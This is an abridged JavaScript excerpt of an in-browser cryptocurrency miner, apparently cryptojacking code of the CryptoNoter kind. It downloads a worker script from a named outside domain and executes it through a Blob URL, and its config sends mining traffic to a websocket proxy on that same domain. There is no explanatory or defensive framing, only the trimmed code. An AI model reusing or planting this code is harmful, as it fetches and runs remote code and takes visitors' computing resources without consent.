(function (window) {
    ...
    Miner.prototype.start = function (mode) {
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.addEventListener("load", function () {
                ch.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
                this._asmjsStatus = "loaded";
                this._startNow()
            }.bind(this), xhr);
            xhr.open("get", "https://www.bdoteach.me/worker.js", true);
            xhr.send()
            ...
            xhr.open("get", ch.CONFIG.LIB_URL + "cryptonoter-asmjs.min.js", true);
            xhr.send()
        }
    };
    ...
    Miner.prototype._startNow = function () {
        ...
        if (this._tab.mode === ch.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
            return
        }
        ...
        this._autoReconnect = true;
        if (ch.CONFIG.REQUIRES_AUTH) {
            this._auth = this._auth || new ch.Auth(this._siteKey);
    ...
    Miner.prototype._connect = function () {
        ...
        var shards = ch.CONFIG.WEBSOCKET_SHARDS;
    ...
    Miner.prototype._onMessage = function (ev) {
        ...
        if (msg.type === "job") {
            ...
            if (console && console.error) {
                console.error("ch Error:", msg.params.error)
            }
...
self.ch = self.ch || {};
self.ch.CONFIG = {
    LIB_URL: "https://www.bdoteach.me/lib/",
    WEBSOCKET_SHARDS: [["wss://www.bdoteach.me/proxy"]]
};
